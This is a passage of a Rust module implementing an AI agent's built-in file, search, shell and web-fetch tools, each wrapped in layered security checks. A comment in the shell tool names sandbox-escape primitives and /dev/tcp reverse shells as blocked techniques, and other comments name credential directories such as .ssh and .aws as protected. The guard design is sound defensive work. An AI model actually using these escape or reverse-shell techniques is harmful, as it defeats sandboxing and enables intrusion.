//! 内置原生工具集（D 期核心交付）
//!
//! 全部工具实现 `mcp::ToolExecutor` trait，统一注册到 `ToolRegistry`，
//! 经 `register_builtin_tools` 一次性挂载。工具覆盖文件系统、内容检索、
//! 沙箱 shell、受 SSRF 防护的网络、结构化数据查询——对应 标准 AI 助手 的
//! 等价能力，并额外叠加命令护栏与 SSRF 防护。
//!
//! 这是「46 原生工具」目标的核心子集（20 个高频工具），其余工具沿用同一
//! `LocalTool` 工厂模式即可线性扩展，无需改动注册链路。

use std::collections::HashMap;
use std::future::Future;
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{anyhow, Context, Result};
use async_trait::async_trait;
use serde_json::json;

use crate::agent::tool_cycle::ToolResult;
use crate::automation::{Automation, AutomationManager, JobKind};
use crate::browser::{BrowserBridge, PageSession};
use crate::mcp::registry::{ToolExecutor, ToolRegistry};
use crate::memory::{ExperienceKind, ExperienceLedger};
use crate::research::ResearchCapability;
use crate::security::scanner_l3::OpKind;
use crate::security::{
    normalize_workspace, sandboxed_exec, CommandGuard, Preflight, PreflightDecision, SsrfGuard,
    DEFAULT_TIMEOUT,
};
use crate::tools::fs_path::safe_resolve;
use crate::tools::git::{git_tool, SystemGitRunner};
use crate::tools::register_computer_use_tools;
use crate::tools::versions::VersionManager;
use crate::vision::{image_metadata, VisionCapability};

/// 工具执行闭包类型（future 生命周期绑定输入引用）
type ToolFn = Arc<
    dyn for<'a> Fn(
            &'a HashMap<String, String>,
        ) -> Pin<Box<dyn Future<Output = Result<ToolResult>> + Send + 'a>>
        + Send
        + Sync,
>;

/// 通用本地工具：以闭包承载实现，消除每个工具的结构体样板
pub struct LocalTool {
    name: &'static str,
    description: &'static str,
    schema: serde_json::Value,
    run: ToolFn,
}

#[async_trait]
impl ToolExecutor for LocalTool {
    fn name(&self) -> &str {
        self.name
    }
    fn description(&self) -> &str {
        self.description
    }
    fn input_schema(&self) -> serde_json::Value {
        self.schema.clone()
    }
    async fn execute(&self, args: &HashMap<String, String>) -> Result<ToolResult> {
        (self.run)(args).await
    }
}

fn boxed(
    name: &'static str,
    description: &'static str,
    schema: serde_json::Value,
    run: ToolFn,
) -> Box<dyn ToolExecutor> {
    Box::new(LocalTool {
        name,
        description,
        schema,
        run,
    })
}

/// 公开版 `boxed`：供其他工具模块（如 `tools::git`）构造 `LocalTool` 并注册，
/// 避免每个模块重复结构体样板。
pub fn make_local_tool(
    name: &'static str,
    description: &'static str,
    schema: serde_json::Value,
    run: ToolFn,
) -> Box<dyn ToolExecutor> {
    boxed(name, description, schema, run)
}

fn ok(data: String) -> Result<ToolResult> {
    Ok(ToolResult::Success {
        data,
        metadata: HashMap::new(),
    })
}

fn err(message: String, code: &str) -> Result<ToolResult> {
    Ok(ToolResult::Error {
        message,
        code: code.to_string(),
    })
}

/// 解析当前 task-local 会话（无 `SESSION` 上下文时返回空串；
/// `record_artifact` 会回退到默认会话并告警，满足 R1「尽量带上会话归属」）。
fn current_session() -> String {
    crate::usage::SESSION
        .try_with(|s| s.to_string())
        .unwrap_or_default()
}

// ---------------------------------------------------------------------------
// L2/L3 预执行安全闸口（分层护栏的运行时接入点）
// ---------------------------------------------------------------------------

/// 进程级共享的 L2+L3 闸口。
///
/// `Preflight::new()` 会编译约 20 条 L2 正则，构造开销不小，因此全进程复用一份；
/// 扫描本身是无状态纯函数，可安全并发调用。
static PREFLIGHT: std::sync::LazyLock<Preflight> = std::sync::LazyLock::new(Preflight::new);

/// 把预执行裁决转成工具错误结果；放行时返回 `None`。
///
/// 用法：`if let Some(denied) = gate(&PREFLIGHT.check_write(..)) { return denied; }`
///
/// 之所以统一走这里，是为了保证**所有**写/删/执行路径的拒绝语义、错误码、
/// 提示文案完全一致——避免各工具各写一套导致"有的拦有的漏"。
fn gate(decision: &PreflightDecision) -> Option<Result<ToolResult>> {
    match decision {
        PreflightDecision::Allow => None,
        PreflightDecision::Deny {
            layer,
            code,
            reason,
        } => Some(err(
            format!("[{layer}] 操作被分层安全护栏阻断: {reason}"),
            code,
        )),
    }
}

// ---------------------------------------------------------------------------
// 辅助函数
// ---------------------------------------------------------------------------

/// 递归收集工作区内文件（跳过巨型无关目录）
fn walk_files(root: &Path, out: &mut Vec<PathBuf>) {
    if let Ok(entries) = std::fs::read_dir(root) {
        for e in entries.flatten() {
            let p = e.path();
            if p.is_dir() {
                let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
                if matches!(
                    name,
                    ".git" | "target" | "node_modules" | ".versions" | "build"
                ) {
                    continue;
                }
                walk_files(&p, out);
            } else if p.is_file() {
                out.push(p);
            }
        }
    }
}

/// 计算两段文本的行级 diff（LCS），返回类 unified 文本
fn diff_lines(old: &str, new: &str) -> String {
    let a: Vec<&str> = old.lines().collect();
    let b: Vec<&str> = new.lines().collect();
    let n = a.len();
    let m = b.len();
    let mut dp = vec![vec![0usize; m + 1]; n + 1];
    for i in (0..n).rev() {
        for j in (0..m).rev() {
            if a[i] == b[j] {
                dp[i][j] = dp[i + 1][j + 1] + 1;
            } else {
                dp[i][j] = dp[i + 1][j].max(dp[i][j + 1]);
            }
        }
    }
    let mut out = String::new();
    let (mut i, mut j) = (0usize, 0usize);
    while i < n && j < m {
        if a[i] == b[j] {
            out.push_str(&format!("  {}\n", a[i]));
            i += 1;
            j += 1;
        } else if dp[i + 1][j] >= dp[i][j + 1] {
            out.push_str(&format!("- {}\n", a[i]));
            i += 1;
        } else {
            out.push_str(&format!("+ {}\n", b[j]));
            j += 1;
        }
    }
    while i < n {
        out.push_str(&format!("- {}\n", a[i]));
        i += 1;
    }
    while j < m {
        out.push_str(&format!("+ {}\n", b[j]));
        j += 1;
    }
    out
}

/// 按点分路径（支持数组下标）从 JSON 提取值
fn json_query(json_str: &str, path: &str) -> Result<String> {
    let v: serde_json::Value =
        serde_json::from_str(json_str).with_context(|| "invalid JSON input")?;
    let mut cur = &v;
    for seg in path.split('.') {
        if seg.is_empty() {
            continue;
        }
        if let Ok(idx) = seg.parse::<usize>() {
            cur = cur
                .get(idx)
                .ok_or_else(|| anyhow!("array index out of range: {}", seg))?;
        } else {
            cur = cur
                .get(seg)
                .ok_or_else(|| anyhow!("key not found: {}", seg))?;
        }
    }
    match cur {
        serde_json::Value::String(s) => Ok(s.clone()),
        other => Ok(other.to_string()),
    }
}

// ---------------------------------------------------------------------------
// 工具工厂
// ---------------------------------------------------------------------------

fn read_file_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "read_file",
        "读取工作区内文本文件内容。参数: path(相对路径), limit(可选, 限制行数)",
        json!({"type":"object","properties":{"path":{"type":"string"},"limit":{"type":"number"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let abs = safe_resolve(&ws, p)?;
                if !abs.is_file() {
                    return err(format!("not a file: {}", p), "NOT_FOUND");
                }
                let content =
                    std::fs::read_to_string(&abs).map_err(|e| anyhow!("read {}: {}", p, e))?;
                let shown = match args.get("limit") {
                    Some(l) => {
                        let n: usize = l.parse().unwrap_or(usize::MAX);
                        content.lines().take(n).collect::<Vec<_>>().join("\n")
                    }
                    None => content,
                };
                ok(shown)
            })
        }),
    )
}

fn write_file_tool(
    workspace: PathBuf,
    versions: Arc<Option<VersionManager>>,
) -> Box<dyn ToolExecutor> {
    boxed(
        "write_file",
        "写入（覆盖）工作区内文件，写入前自动快照旧版本。参数: path, content",
        json!({"type":"object","properties":{"path":{"type":"string"},"content":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            let versions = versions.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let content = args
                    .get("content")
                    .ok_or_else(|| anyhow!("missing 'content'"))?;
                let abs = safe_resolve(&ws, p)?;
                // L3 路径边界 + L2 内容扫描：必须在创建父目录/落盘之前，
                // 否则被拒的写入仍会留下副作用（空目录）。
                if let Some(denied) =
                    gate(&PREFLIGHT.check_write(&abs, &normalize_workspace(&ws), content))
                {
                    return denied;
                }
                if let Some(parent) = abs.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                let existed = abs.exists();
                let before = if existed {
                    std::fs::read_to_string(&abs).unwrap_or_default()
                } else {
                    String::new()
                };
                if let Some(vm) = versions.as_ref() {
                    if existed {
                        let _ = vm.snapshot_file(&abs);
                    }
                }
                std::fs::write(&abs, content)?;
                crate::tools::file_change::record_file_change(
                    p,
                    if existed { "modify" } else { "create" },
                    &before,
                    content,
                    "write_file",
                );
                // 记录产物到当前会话（R1 + R4：无 SESSION 时回退默认会话并告警）
                let sess = current_session();
                crate::tools::file_change::record_artifact(
                    &sess,
                    p,
                    if existed { "modified" } else { "created" },
                );
                ok(format!("wrote {} bytes to {}", content.len(), p))
            })
        }),
    )
}

fn append_file_tool(
    workspace: PathBuf,
    versions: Arc<Option<VersionManager>>,
) -> Box<dyn ToolExecutor> {
    boxed(
        "append_file",
        "向工作区内文件追加内容，追加前自动快照。参数: path, content",
        json!({"type":"object","properties":{"path":{"type":"string"},"content":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            let versions = versions.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let content = args
                    .get("content")
                    .ok_or_else(|| anyhow!("missing 'content'"))?;
                let abs = safe_resolve(&ws, p)?;
                if let Some(denied) =
                    gate(&PREFLIGHT.check_write(&abs, &normalize_workspace(&ws), content))
                {
                    return denied;
                }
                if let Some(parent) = abs.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                if let Some(vm) = versions.as_ref() {
                    if abs.exists() {
                        let _ = vm.snapshot_file(&abs);
                    }
                }
                use std::io::Write;
                let mut f = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&abs)?;
                f.write_all(content.as_bytes())?;
                let sess = current_session();
                crate::tools::file_change::record_artifact(&sess, p, "appended");
                ok(format!("appended {} bytes to {}", content.len(), p))
            })
        }),
    )
}

fn list_dir_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "list_dir",
        "列出目录内容（文件/子目录 + 大小）。参数: path(默认工作区根)",
        json!({"type":"object","properties":{"path":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let rel = args.get("path").map(|s| s.as_str()).unwrap_or(".");
                let abs = safe_resolve(&ws, rel)?;
                if !abs.is_dir() {
                    return err(format!("not a directory: {}", rel), "NOT_DIR");
                }
                let mut lines = Vec::new();
                for e in std::fs::read_dir(&abs)?.flatten() {
                    let p = e.path();
                    let kind = if p.is_dir() { "dir " } else { "file" };
                    let size = p.metadata().map(|m| m.len()).unwrap_or(0);
                    let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("?");
                    lines.push(format!("{}\t{:>10}\t{}", kind, size, name));
                }
                lines.sort();
                ok(lines.join("\n"))
            })
        }),
    )
}

fn find_files_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "find_files",
        "按名称子串在工作区内查找文件。参数: name(子串), max(可选, 上限)",
        json!({"type":"object","properties":{"name":{"type":"string"},"max":{"type":"number"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let name = args.get("name").ok_or_else(|| anyhow!("missing 'name'"))?;
                let max: usize = args.get("max").and_then(|m| m.parse().ok()).unwrap_or(200);
                let mut all = Vec::new();
                walk_files(&ws, &mut all);
                let mut hits: Vec<String> = all
                    .iter()
                    .filter(|p| {
                        p.file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("")
                            .contains(name)
                    })
                    .map(|p| {
                        p.strip_prefix(&ws)
                            .unwrap_or(p)
                            .to_string_lossy()
                            .replace('\\', "/")
                    })
                    .take(max)
                    .collect();
                hits.sort();
                ok(format!(
                    "found {} file(s):\n{}",
                    hits.len(),
                    hits.join("\n")
                ))
            })
        }),
    )
}

fn file_info_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "file_info",
        "返回文件/目录的元信息（大小、是否为目录、修改时间）。参数: path",
        json!({"type":"object","properties":{"path":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let abs = safe_resolve(&ws, p)?;
                let meta = std::fs::metadata(&abs)?;
                let info = json!({
                    "path": p,
                    "is_dir": meta.is_dir(),
                    "is_file": meta.is_file(),
                    "size_bytes": meta.len(),
                    "modified": meta.modified().map(|t| format!("{:?}", t)).unwrap_or_default(),
                });
                ok(info.to_string())
            })
        }),
    )
}

fn grep_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "grep",
        "在工作区内按正则搜索文件内容，返回命中行(file:line:text)。参数: pattern, path(可选,限定目录), max(可选)",
        json!({"type":"object","properties":{"pattern":{"type":"string"},"path":{"type":"string"},"max":{"type":"number"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let pattern = args.get("pattern").ok_or_else(|| anyhow!("missing 'pattern'"))?;
                let re = regex::Regex::new(pattern).map_err(|e| anyhow!("invalid regex: {}", e))?;
                let root = match args.get("path") {
                    Some(p) => safe_resolve(&ws, p)?,
                    None => ws.clone(),
                };
                let max: usize = args.get("max").and_then(|m| m.parse().ok()).unwrap_or(200);
                let mut all = Vec::new();
                walk_files(&root, &mut all);
                let mut hits: Vec<String> = Vec::new();
                for f in &all {
                    if hits.len() >= max {
                        break;
                    }
                    // 跳过明显二进制（按扩展名粗判）
                    let ext = f.extension().and_then(|e| e.to_str()).unwrap_or("");
                    if matches!(ext, "png" | "jpg" | "jpeg" | "gif" | "pdf" | "zip" | "exe" | "dll" | "so" | "o" | "rlib" | "rmeta") {
                        continue;
                    }
                    let content = match std::fs::read_to_string(f) {
                        Ok(c) => c,
                        Err(_) => continue,
                    };
                    let rel = f.strip_prefix(&ws).unwrap_or(f).to_string_lossy().replace('\\', "/");
                    for (i, line) in content.lines().enumerate() {
                        if re.is_match(line) {
                            hits.push(format!("{}:{}:{}", rel, i + 1, line.trim()));
                            if hits.len() >= max {
                                break;
                            }
                        }
                    }
                }
                ok(format!("{} match(es):\n{}", hits.len(), hits.join("\n")))
            })
        }),
    )
}

fn codebase_search_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "codebase_search",
        "在工作区内检索关键词，返回按命中次数排序的文件清单（轻量语义定位）。参数: query, max(可选)",
        json!({"type":"object","properties":{"query":{"type":"string"},"max":{"type":"number"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let query = args.get("query").ok_or_else(|| anyhow!("missing 'query'"))?;
                let max: usize = args.get("max").and_then(|m| m.parse().ok()).unwrap_or(20);
                let re = regex::Regex::new(&regex::escape(query))
                    .map_err(|e| anyhow!("invalid query: {}", e))?;
                let mut all = Vec::new();
                walk_files(&ws, &mut all);
                let mut scored: Vec<(usize, String)> = Vec::new();
                for f in &all {
                    let ext = f.extension().and_then(|e| e.to_str()).unwrap_or("");
                    if matches!(ext, "png" | "jpg" | "pdf" | "zip" | "exe" | "dll" | "so" | "o" | "rlib" | "rmeta") {
                        continue;
                    }
                    let content = match std::fs::read_to_string(f) {
                        Ok(c) => c,
                        Err(_) => continue,
                    };
                    let count = re.find_iter(&content).count();
                    if count > 0 {
                        let rel = f.strip_prefix(&ws).unwrap_or(f).to_string_lossy().replace('\\', "/");
                        scored.push((count, rel));
                    }
                }
                scored.sort_by(|a, b| b.0.cmp(&a.0));
                let out: Vec<String> = scored.into_iter().take(max).map(|(c, r)| format!("{:>5}\t{}", c, r)).collect();
                ok(format!("{} file(s) ranked:\n{}", out.len(), out.join("\n")))
            })
        }),
    )
}

fn code_intel_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "code_intel",
        "项目代码智能：增量索引 + 符号/文本混合检索。action: index(建索引)/symbols(按名查符号)/search(混合检索)。参数: action, query(可选), workspace(可选,缺省工作区根), max(可选)",
        json!({"type":"object","properties":{
            "action":{"type":"string"},
            "query":{"type":"string"},
            "workspace":{"type":"string"},
            "max":{"type":"number"}
        }}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let action = args.get("action").map(|s| s.as_str()).unwrap_or("search");
                let ws_path = match args.get("workspace").filter(|s| !s.trim().is_empty()) {
                    Some(p) => safe_resolve(&ws, p)?,
                    None => ws.clone(),
                };
                let max: usize = args.get("max").and_then(|m| m.parse().ok()).unwrap_or(20);
                let query = args.get("query").cloned().unwrap_or_default();
                match action {
                    "index" => match crate::codeintel::CodeIntel::index(&ws_path) {
                        Ok(report) => ok(format!(
                            "索引完成: {} 文件(更新 {} / 未变 {} / 移除 {} / 跳过 {})，符号 {}",
                            report.files_total,
                            report.files_updated,
                            report.files_unchanged,
                            report.files_removed,
                            report.skipped,
                            report.symbols_total
                        )),
                        Err(e) => err(format!("索引失败: {e}"), "INDEX_ERROR"),
                    },
                    "symbols" => match crate::codeintel::CodeIntel::symbols(&ws_path, &query, max) {
                        Ok(items) => {
                            if items.is_empty() {
                                return ok("0 symbol(s)".into());
                            }
                            let lines: Vec<String> = items
                                .iter()
                                .map(|s| format!("{}\t{}\t{}:{}", s.kind, s.name, s.path, s.line))
                                .collect();
                            ok(format!("{} symbol(s):\n{}", items.len(), lines.join("\n")))
                        }
                        Err(e) => err(format!("符号查询失败: {e}"), "SYMBOL_ERROR"),
                    },
                    _ => match crate::codeintel::CodeIntel::search(&ws_path, &query, max) {
                        Ok(items) => {
                            if items.is_empty() {
                                return ok("0 hit(s)".into());
                            }
                            let lines: Vec<String> = items
                                .iter()
                                .map(|h| match h.line {
                                    Some(l) => format!("[{}] {}:{} {}", h.source, h.path, l, h.snippet),
                                    None => format!("[{}] {} {}", h.source, h.path, h.snippet),
                                })
                                .collect();
                            ok(format!("{} hit(s):\n{}", items.len(), lines.join("\n")))
                        }
                        Err(e) => err(format!("检索失败: {e}"), "SEARCH_ERROR"),
                    },
                }
            })
        }),
    )
}

fn edit_file_tool(
    workspace: PathBuf,
    versions: Arc<Option<VersionManager>>,
) -> Box<dyn ToolExecutor> {
    boxed(
        "edit_file",
        "在文件中将 old_string 替换为 new_string。参数: path, old_string, new_string, all(可选,'true'替换全部)",
        json!({"type":"object","properties":{"path":{"type":"string"},"old_string":{"type":"string"},"new_string":{"type":"string"},"all":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            let versions = versions.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let old = args.get("old_string").ok_or_else(|| anyhow!("missing 'old_string'"))?;
                let new = args.get("new_string").ok_or_else(|| anyhow!("missing 'new_string'"))?;
                let all = args.get("all").map(|s| s == "true" || s == "1").unwrap_or(false);
                let abs = safe_resolve(&ws, p)?;
                if !abs.is_file() {
                    return err(format!("not a file: {}", p), "NOT_FOUND");
                }
                // L3 路径边界 + L2 扫描「本次新引入的内容」。
                // 刻意只扫 new_string 而非替换后的全文：文件里既有的历史内容
                // 不该让一次无关编辑失败（否则连 scanner_l2.rs 自身都改不了），
                // 但任何**新注入**的恶意片段都会在这里被挡下。
                if let Some(denied) =
                    gate(&PREFLIGHT.check_write(&abs, &normalize_workspace(&ws), new))
                {
                    return denied;
                }
                if let Some(vm) = versions.as_ref() {
                    let _ = vm.snapshot_file(&abs);
                }
                let content = std::fs::read_to_string(&abs)?;
                if !content.contains(old) {
                    return err(format!("old_string not found in {}", p), "NO_MATCH");
                }
                let replaced = if all {
                    content.replace(old, new)
                } else {
                    content.replacen(old, new, 1)
                };
                std::fs::write(&abs, &replaced)?;
                crate::tools::file_change::record_file_change(p, "modify", &content, &replaced, "edit_file");
                let sess = current_session();
                crate::tools::file_change::record_artifact(&sess, p, "modified");
                ok(format!("edited {} ({}->{} bytes)", p, content.len(), replaced.len()))
            })
        }),
    )
}

fn copy_file_tool(
    workspace: PathBuf,
    versions: Arc<Option<VersionManager>>,
) -> Box<dyn ToolExecutor> {
    boxed(
        "copy_file",
        "复制文件到目标路径（覆盖前快照目标）。参数: src, dst",
        json!({"type":"object","properties":{"src":{"type":"string"},"dst":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            let versions = versions.clone();
            Box::pin(async move {
                let src = args.get("src").ok_or_else(|| anyhow!("missing 'src'"))?;
                let dst = args.get("dst").ok_or_else(|| anyhow!("missing 'dst'"))?;
                let abs_src = safe_resolve(&ws, src)?;
                let abs_dst = safe_resolve(&ws, dst)?;
                if !abs_src.is_file() {
                    return err(format!("source not a file: {}", src), "NOT_FOUND");
                }
                let guard_cwd = normalize_workspace(&ws);
                // 目标路径过 L3；源文件内容过 L2（复制是"内容落到新位置"，
                // 等价于一次写入，不能因为内容不是本次生成就免检）。
                if let Some(denied) =
                    gate(&PREFLIGHT.check_path(OpKind::WriteFile, &abs_dst, &guard_cwd))
                {
                    return denied;
                }
                if let Ok(src_text) = std::fs::read_to_string(&abs_src) {
                    if let Some(denied) = gate(&PREFLIGHT.check_content(&src_text)) {
                        return denied;
                    }
                }
                if let Some(parent) = abs_dst.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                if let Some(vm) = versions.as_ref() {
                    if abs_dst.exists() {
                        let _ = vm.snapshot_file(&abs_dst);
                    }
                }
                std::fs::copy(&abs_src, &abs_dst)?;
                let sess = current_session();
                crate::tools::file_change::record_artifact(&sess, dst, "copied");
                ok(format!("copied {} -> {}", src, dst))
            })
        }),
    )
}

fn move_file_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "move_file",
        "移动/重命名文件。参数: src, dst",
        json!({"type":"object","properties":{"src":{"type":"string"},"dst":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let src = args.get("src").ok_or_else(|| anyhow!("missing 'src'"))?;
                let dst = args.get("dst").ok_or_else(|| anyhow!("missing 'dst'"))?;
                let abs_src = safe_resolve(&ws, src)?;
                let abs_dst = safe_resolve(&ws, dst)?;
                // 移动同时改变源与目标两端，两端都要过 L3
                // （例如把文件移进 .ssh/，或把 .git 里的文件移出来）。
                let guard_cwd = normalize_workspace(&ws);
                if let Some(denied) =
                    gate(&PREFLIGHT.check_path(OpKind::Move, &abs_src, &guard_cwd))
                {
                    return denied;
                }
                if let Some(denied) =
                    gate(&PREFLIGHT.check_path(OpKind::WriteFile, &abs_dst, &guard_cwd))
                {
                    return denied;
                }
                if let Some(parent) = abs_dst.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                std::fs::rename(&abs_src, &abs_dst)?;
                let sess = current_session();
                crate::tools::file_change::record_artifact(&sess, dst, "moved");
                ok(format!("moved {} -> {}", src, dst))
            })
        }),
    )
}

fn delete_file_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "delete_file",
        "删除工作区内文件或空目录（不可恢复，请谨慎）。参数: path",
        json!({"type":"object","properties":{"path":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let abs = safe_resolve(&ws, p)?;
                if let Some(denied) =
                    gate(&PREFLIGHT.check_path(OpKind::Delete, &abs, &normalize_workspace(&ws)))
                {
                    return denied;
                }
                let was_file = abs.is_file();
                let before = if was_file {
                    std::fs::read_to_string(&abs).unwrap_or_default()
                } else {
                    String::new()
                };
                if abs.is_dir() {
                    std::fs::remove_dir(&abs)?;
                } else {
                    std::fs::remove_file(&abs)?;
                }
                if was_file {
                    crate::tools::file_change::record_file_change(
                        p,
                        "delete",
                        &before,
                        "",
                        "delete_file",
                    );
                }
                ok(format!("deleted {}", p))
            })
        }),
    )
}

fn make_dir_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "make_dir",
        "创建目录（含父目录）。参数: path",
        json!({"type":"object","properties":{"path":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let abs = safe_resolve(&ws, p)?;
                // 建目录也是写操作：阻止在工作区内凭空造出 .ssh/ .aws/ 等凭证目录
                if let Some(denied) =
                    gate(&PREFLIGHT.check_path(OpKind::WriteFile, &abs, &normalize_workspace(&ws)))
                {
                    return denied;
                }
                std::fs::create_dir_all(&abs)?;
                let sess = current_session();
                crate::tools::file_change::record_artifact(&sess, p, "directory");
                ok(format!("created dir {}", p))
            })
        }),
    )
}

fn shell_exec_tool(workspace: PathBuf, guard: Arc<CommandGuard>) -> Box<dyn ToolExecutor> {
    boxed(
        "shell_exec",
        "在工作区内执行 shell 命令（经命令护栏拦截高危操作，超时强制终止）。参数: command, timeout_sec(可选)",
        json!({"type":"object","properties":{"command":{"type":"string"},"timeout_sec":{"type":"number"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            let guard = guard.clone();
            Box::pin(async move {
                let cmd = args.get("command").ok_or_else(|| anyhow!("missing 'command'"))?;
                let timeout = match args.get("timeout_sec").and_then(|t| t.parse::<u64>().ok()) {
                    Some(s) => Duration::from_secs(s),
                    None => DEFAULT_TIMEOUT,
                };
                // L2+L3 在 L1（sandboxed_exec 内的 CommandGuard）之前先行裁决。
                // 补的是 CommandGuard 正则表里没有的洞：chroot / unshare / nsenter /
                // pkexec / docker --privileged 等沙箱逃逸原语，以及 /dev/tcp 反弹 shell。
                if let Some(denied) = gate(&PREFLIGHT.check_exec(cmd, &normalize_workspace(&ws))) {
                    return denied;
                }
                match sandboxed_exec(cmd, &ws, timeout, &guard).await {
                    Ok(o) => ok(format!(
                        "[exit {}]\n--- stdout ---\n{}\n--- stderr ---\n{}",
                        o.exit_code, o.stdout, o.stderr
                    )),
                    Err(e) => err(e.to_string(), "EXEC_ERROR"),
                }
            })
        }),
    )
}

// ── 全程联网：web_fetch 正文提取（readability 风格，零依赖）──
//
// 对齐 外部参考 snapshot-ref / readability 范式：抓取页面后剔除脚本与导航噪音，
// 提取 标题 + meta 描述 + 主内容段落，供 Agent 深读正文而非原始 HTML 噪音。

/// 粗判响应是否为 HTML 文档（非 HTML 的纯文本/JSON 原样截断返回）
///
/// 要求文本以 `<` 开头（HTML 文档必然），避免 JSON/纯文本中恰好含 `<body>` 等子串被误判。
fn looks_like_html(text: &str) -> bool {
    let lower = text.trim_start().to_ascii_lowercase();
    if !lower.starts_with('<') {
        return false;
    }
    lower.starts_with("<!doctype html")
        || lower.starts_with("<html")
        || lower.starts_with("<head")
        || lower.starts_with("<body")
        || lower.contains("<title")
}

/// 去掉 HTML 中的脚本/样式/模板/内嵌 SVG 噪音区间
fn strip_noise_tags(html: &str) -> String {
    let re = regex::Regex::new(
        r"(?is)<(?:script|style|noscript|template|svg)\b[^>]*>.*?</(?:script|style|noscript|template|svg)\s*>",
    )
    .expect("noise tag regex 应恒可编译");
    re.replace_all(html, "").into_owned()
}

/// 提取首个标签对的内层文本（如 <title>…</title>）
fn extract_tag_content(html: &str, tag: &str) -> String {
    let re = regex::Regex::new(&format!(r"(?is)<{tag}\b[^>]*>(.*?)</{tag}\s*>"))
        .expect("tag regex 应恒可编译");
    re.captures(html)
        .and_then(|c| c.get(1))
        .map(|m| strip_html_tags(m.as_str()))
        .unwrap_or_default()
}

/// 提取 <meta name="description" content="…">（兼容 name=description / property=og:description）
fn extract_meta_description(html: &str) -> String {
    let re = regex::Regex::new(
        r#"(?is)<meta\b[^>]*(?:name|property)\s*=\s*["'](?:description|og:description)["'][^>]*>"#,
    )
    .expect("meta regex 应恒可编译");
    let Some(m) = re.find(html) else {
        return String::new();
    };
    let re_meta = regex::Regex::new(r#"<meta\b[^>]*>"#).expect("meta 标签 regex 应恒可编译");
    let content_re =
        regex::Regex::new(r#"content\s*=\s*["']([^"']*)["']"#).expect("content regex 应恒可编译");
    for tag in re_meta.find_iter(m.as_str()) {
        if let Some(c) = content_re.captures(tag.as_str()) {
            return html_unescape(&c[1]).trim().to_string();
        }
    }
    String::new()
}

/// 提取指定容器（article/main/body 等）标签对内文本
fn tag_zone(html: &str, tag: &str) -> Option<String> {
    let re = regex::Regex::new(&format!(r"(?is)<{tag}\b[^>]*>(.*)</{tag}\s*>"))
        .expect("zone regex 应恒可编译");
    re.captures(html).map(|c| c[1].to_string())
}

/// 收集容器内全部 <p> 段落文本（保留顺序，去内嵌标签）
fn extract_paragraphs(zone: &str) -> Vec<String> {
    let p_re = regex::Regex::new(r"(?is)<p\b[^>]*>(.*?)</p\s*>").expect("p regex 应恒可编译");
    let mut out = Vec::new();
    for cap in p_re.captures_iter(zone) {
        let text = strip_html_tags(&cap[1]);
        let text = text.trim().to_string();
        if !text.is_empty() {
            out.push(text);
        }
    }
    out
}

/// 去除段内标签并解码常见 HTML 实体
fn strip_html_tags(s: &str) -> String {
    let tag_re = regex::Regex::new(r"(?s)<[^>]*>").expect("tag strip regex 应恒可编译");
    html_unescape(&tag_re.replace_all(s, ""))
}

fn html_unescape(s: &str) -> String {
    s.replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x27;", "'")
        .replace("&nbsp;", " ")
}

/// readability 风格正文提取：标题 + 描述 + 主内容段落（article/main 优先，回退 body 全部 <p>）
fn extract_readable(html: &str, max_chars: usize) -> String {
    let stripped = strip_noise_tags(html);
    let title = extract_tag_content(&stripped, "title");
    let description = extract_meta_description(&stripped);

    // 主内容：优先 article/main 段落；不足 2 段则回退到 body 级 <p>
